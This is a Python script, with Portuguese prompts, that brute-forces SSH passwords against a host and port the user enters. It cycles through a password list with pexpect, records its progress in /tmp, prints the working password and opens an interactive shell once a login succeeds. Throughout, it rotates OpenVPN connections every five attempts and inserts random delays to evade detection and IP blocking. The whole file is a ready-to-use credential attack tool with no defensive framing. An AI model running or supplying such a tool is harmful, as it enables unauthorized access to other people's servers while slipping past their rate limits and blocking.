import pexpect
import random
import passwords
import time
import vpn

passwords = passwords.passwords_
openvpn_enter = vpn.openvpn_enter_()

finded = False

i = 0

KEY_CONFIRMATION = "key_confirmation"
FIRST_PASSWORD = "first_password"
PASSWORD = "password"
SHELL = "shell"
DENIED = "denied"
END = "end"
TIMEOUT = "timeout"


def expect_state(process, states):
    patterns = [pattern for _, pattern in states]
    result = process.expect(patterns)
    return states[result][0]

i = int(input("Qual o valor inicial: "))

user = str(input("Qual o usuário: "))
destino = str(input("Qual o destino: "))
port = str(input("Qual a porta: "))

next_ = random.randint(30, 45)
next5 = 5

while i < len(passwords):

    with open("/tmp/mysql_i", "w") as f:
        f.write(str(i))

    process = pexpect.spawn(
        "ssh",
        [f"{user}@{destino}", "-p", port],
        encoding="utf-8",
        timeout=10,
    )

    result = expect_state(process, [
        (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
        (FIRST_PASSWORD, r"\(.*\) Password:"),
        (PASSWORD, r".+'s password:"),
        (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
        (DENIED, r"Permission denied"),
        (END, pexpect.EOF),
        (TIMEOUT, pexpect.TIMEOUT),
    ])

    if result == KEY_CONFIRMATION:
        print("Aceitando a chave do servidor...")
        process.sendline("yes")
        result = expect_state(process, [
            (FIRST_PASSWORD, r"\(.*\) Password:"),
            (PASSWORD, r".+'s password:"),
            (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
            (DENIED, r"Permission denied"),
            (END, pexpect.EOF),
            (TIMEOUT, pexpect.TIMEOUT),
        ])

    while result in (FIRST_PASSWORD, PASSWORD):
        process.sendline(str(passwords[i]))
        result = expect_state(process, [
            (PASSWORD, r".+'s password:"),
            (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
            (DENIED, r"Permission denied"),
            (END, pexpect.EOF),
            (TIMEOUT, pexpect.TIMEOUT),
        ])

    if result == SHELL:
        password = passwords[i]
        print(password)

        finded = True

        with open("/tmp/mysql_finded", "w") as f:
            f.write("True")

        break

    if result == DENIED:
        print("Permissão negada.")
    elif result == END:
        print("A conexão foi encerrada.")
    elif result == TIMEOUT:
        print("Tempo limite atingido.")

    if result != SHELL:
        process.close()
        i += 1

        if i >= next5:
            openvpn_enter.close()
            openvpn_enter = vpn.openvpn_enter_()

            next5 += 5

        continue

    if i == next_:
        time.sleep(random.randint(25, 40))
        next_ += random.randint(30, 45)

    process.interact()

    delay = random.randint(1, 5)
    time.sleep(delay)

    i += 1

openvpn_enter.close()